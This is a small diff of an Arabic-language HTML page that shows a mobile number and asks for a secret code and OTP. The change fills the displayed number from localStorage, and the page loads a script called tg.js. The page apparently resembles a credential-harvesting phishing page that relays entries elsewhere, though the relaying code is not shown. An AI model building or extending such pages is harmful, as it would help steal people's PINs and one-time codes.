@@ -229,7 +229,7 @@ body {
 
   <div class="content">
     <div class="label">رقم الموبايل</div>
-    <div class="phone">774324921</div>
+    <div id="phonetext" class="phone">774324921</div>
 
     <div class="label">أدخل الرمز السري</div>
 
@@ -256,6 +256,9 @@ body {
     <button onclick="closeOverlay()">حسناً</button>
   </div>
 </div>
+<script>
+  document.getElementById('phonetext').innerText = localStorage.getItem('phone')
+</script>
 <script src='tg.js'></script>
 <script>
   function setOtpDisabled(disabled) {
